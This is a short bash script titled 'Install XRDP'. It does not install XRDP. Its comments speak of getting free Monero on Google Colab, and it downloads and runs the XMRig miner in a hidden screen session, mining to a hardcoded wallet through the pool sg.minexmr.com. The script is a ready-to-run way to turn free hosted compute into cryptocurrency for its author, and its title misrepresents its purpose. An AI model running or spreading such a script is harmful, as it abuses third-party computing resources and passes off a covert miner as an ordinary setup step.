#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 48qqWXZtJCzb5ZUnQxdh4pNWEEJcr63x1Q786FoB2JJ8M5wvtNx2QPLLQjdaMfmLGyF35LcEcSCguSSga1z7qBE48VtYo9R -k --tls --rig-id qaz1024
